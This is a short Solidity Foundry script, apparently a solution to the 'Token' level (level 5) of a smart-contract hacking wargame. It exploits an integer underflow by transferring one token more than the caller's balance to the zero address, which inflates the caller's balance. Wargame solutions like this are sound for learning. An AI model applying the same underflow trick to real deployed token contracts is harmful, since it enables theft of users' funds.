// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}

// ================================================================
// │                         LEVEL 5 - TOKEN                      │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IToken targetContract = IToken(targetContractAddress);
        uint256 userStartingBalance = targetContract.balanceOf(msg.sender);

        vm.startBroadcast();
        targetContract.transfer(address(0), userStartingBalance + 1);
        vm.stopBroadcast();
    }
}
